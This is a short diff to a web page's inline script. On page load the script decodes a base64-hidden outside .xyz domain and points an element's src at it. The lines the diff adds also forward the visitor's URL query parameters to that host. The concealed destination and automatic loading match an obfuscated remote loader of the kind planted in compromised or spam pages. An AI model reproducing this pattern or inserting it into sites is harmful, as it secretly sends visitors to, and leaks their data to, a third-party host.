@@ -13,12 +13,13 @@
 </body>
 <script type="text/javascript">
   document.addEventListener("DOMContentLoaded", function () {
-  var params = new URLSearchParams(window.location.search);
+    var params = new URLSearchParams(window.location.search);
     var rabi = "mila-herun";
     var base = "aHR0cHM6Ly93d3cua2FsYWhhcnUueHl6Lw==";
     var awkey = window.atob(base) + rabi;
+    var well = awkey + params;
     var value = document.getElementById("ngent").src;
-    document.getElementById("ngent").setAttribute("src", awkey);
+    document.getElementById("ngent").setAttribute("src", well);
 });
 </script>
 </html>
